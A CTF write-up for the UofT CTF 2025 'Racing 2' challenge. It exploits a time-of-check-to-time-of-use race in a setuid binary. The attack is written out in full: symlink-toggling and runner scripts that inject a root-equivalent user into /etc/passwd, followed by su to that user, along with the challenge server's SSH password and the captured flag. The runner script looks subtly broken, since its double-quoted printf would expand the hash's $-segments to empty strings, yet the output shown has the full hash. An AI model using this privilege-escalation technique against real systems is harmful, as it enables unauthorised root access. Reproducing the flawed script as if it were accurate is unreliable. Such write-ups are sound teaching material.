# UofT CTF 2025 - misc/Racing 2

*published: 2025-01-29*

## Introduction

This weekend, I played UoftCTF 2025, a CTF competition run by the University of Toronto Capture the Flag Team, with PBR | UCLA.

I solved an interesting challenge called “Racing 2”, relating to a critical vulnerability in rsync that was recently discovered. This writeup will walk through my process of solving “Racing 2.”

The challenge provided the following:

**SSH Access:**
```
ssh user@34.19.76.234 -p 2222  
Password: racing-chals
```

**A C Program (chal.c):**
```c
int main(int argc, char **argv)
{
    char *fn = "/home/user/permitted";
    char buffer[128];
    FILE *fp;

    if (!access(fn, W_OK))
    {
        printf("Enter text to write: ");
        scanf("%100s", buffer);
        fp = fopen(fn, "w");
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
        return 0;
    }
    else
    {
        printf("Cannot write to file.\n");
        return 1;
    }
}
```

**Hint:**  
*I just watched Cars 2, and its a lot cooler. But hey, you thought you could get the flag by reading a file? Think again.*

## Environment

After logging into the provided SSH environment, I did some initial exploration with basic Linux commands.

The root directory contained several standard Linux folders and a few interesting files including the /challenge directory and /flag.txt/, a root-owned file with restricted read permissions (-r--------). 

The binary had the setuid root `(-rwsr-xr-x)` property, meaning it executed with root privileges regardless of the user running it.  
Running the binary without modification resulted in an error: Cannot write to file.  

I realized we could probably run exploit scripts in /tmp because it's writable.  
The goal was to retrieve the flag located in /flag.txt, but the flag was only readable by root. The chal binary, since it was setuid root, was the key to achieving this.


## Thoughts

The chal.c program had a time-of-check-to-time-of-use (TOCTOU) vulnerability:

- it checked if `/home/user/permitted` was writable using access(fn, W_OK)
- after confirming writability, it opened the file for writing `(fopen(fn, "w"))`

I realized I could exploit this vulnerability by swapping `/home/user/permitted` with a symbolic link to a different file, after the access() check but before the fopen() call.

My strategy was to overwrite `/etc/passwd`, the file that stores system user accounts. Basically, I would write a script to rapidly toggle /home/user/permitted between a writable dummy file (/tmp/legitimate) and /etc/passwd. By injecting a new root-equivalent user into /etc/passwd, I could log in as root and read /flag.txt.


1. Writable dummy file and the toggler script.

   ```bash
   echo "safe content" > /tmp/legitimate

   echo 'while true; do 
     ln -sf /tmp/legitimate /home/user/permitted
     ln -sf /etc/passwd /home/user/permitted
   done' > /tmp/toggler.sh

   chmod +x /tmp/toggler.sh
   ```

2. Generate a password hash for a new root user

   ```bash
   openssl passwd -1 -salt xyz pass

   # Example output:
   $1$xyz$E2BtqrT11oQN8kmxYoxsp1
   ```

3. Write the runner script to inject the root user entry into /etc/passwd.

   ```bash
   echo 'while true; do 
     printf "myrootuser:$1$xyz$E2BtqrT11oQN8kmxYoxsp1:0:0:root:/root:/bin/bash\n" | /challenge/chal
   done' > /tmp/runner.sh

   chmod +x /tmp/runner.sh
   ```

4. Run the toggler script in the background and execute the runner script.

   ```bash
   /tmp/toggler.sh &
   /tmp/runner.sh
   ```

   This combination rapidly toggled the symlink and attempted to write the root user entry to `/etc/passwd`.

5. After letting the scripts run for about 30 seconds, stop them.

   ```bash
   ps aux | grep toggler.sh
   kill -9 <PID>
   ```

   Check that `/etc/passwd` contains your new user.

   ```bash
   cat /etc/passwd
   myrootuser:$1$xyz$E2BtqrT11oQN8kmxYoxsp1:0:0:root:/root:/bin/bash 
   ```

6. Switch to the new root user:

   ```bash
   su myrootuser
   ```

   and enter your password.



## Flag

```bash
cat /flag.txt
```

```
uoftctf{f1nn_mcm155113_15_my_f4v0r173_ch4r4c73r}
```

This challenge was a fun exercise in exploiting race conditions using symlinks and a writable interface. Shoutout to the UofT CTF team for putting together some creative challenges!